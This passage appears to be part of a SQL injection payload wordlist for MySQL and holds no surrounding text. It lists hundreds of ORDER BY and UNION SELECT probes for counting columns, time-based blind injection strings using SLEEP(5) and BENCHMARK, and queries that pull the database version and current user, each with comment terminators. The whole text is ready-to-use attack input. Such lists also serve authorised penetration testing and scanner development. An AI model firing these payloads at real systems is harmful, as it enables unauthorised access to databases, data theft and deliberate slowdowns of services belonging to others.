  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
  ORDER BY SLEEP(5)#
  ORDER BY 1,SLEEP(5)#
  ORDER BY 1,SLEEP(5),3#
  ORDER BY 1,SLEEP(5),3,4#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
  ORDER BY SLEEP(5)-- 
  ORDER BY 1,SLEEP(5)-- 
  ORDER BY 1,SLEEP(5),3-- 
  ORDER BY 1,SLEEP(5),3,4-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
  ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
  UNION ALL SELECT 1
  UNION ALL SELECT 1,2
  UNION ALL SELECT 1,2,3
  UNION ALL SELECT 1,2,3,4
  UNION ALL SELECT 1,2,3,4,5
  UNION ALL SELECT 1,2,3,4,5,6
  UNION ALL SELECT 1,2,3,4,5,6,7
  UNION ALL SELECT 1,2,3,4,5,6,7,8
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
  UNION ALL SELECT 1#
  UNION ALL SELECT 1,2#
  UNION ALL SELECT 1,2,3#
  UNION ALL SELECT 1,2,3,4#
  UNION ALL SELECT 1,2,3,4,5#
  UNION ALL SELECT 1,2,3,4,5,6#
  UNION ALL SELECT 1,2,3,4,5,6,7#
  UNION ALL SELECT 1,2,3,4,5,6,7,8#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
  UNION ALL SELECT 1-- 
  UNION ALL SELECT 1,2-- 
  UNION ALL SELECT 1,2,3-- 
  UNION ALL SELECT 1,2,3,4-- 
  UNION ALL SELECT 1,2,3,4,5-- 
  UNION ALL SELECT 1,2,3,4,5,6-- 
  UNION ALL SELECT 1,2,3,4,5,6,7-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
  UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
  UNION SELECT @@VERSION,SLEEP(5),3
  UNION SELECT @@VERSION,SLEEP(5),USER(),4
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
  UNION SELECT @@VERSION,SLEEP(5),"'3
  UNION SELECT @@VERSION,SLEEP(5),"'3'"#
  UNION SELECT @@VERSION,SLEEP(5),USER(),4#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
  UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
  UNION ALL SELECT USER()-- 
  UNION ALL SELECT SLEEP(5)-- 
  UNION ALL SELECT USER(),SLEEP(5)-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
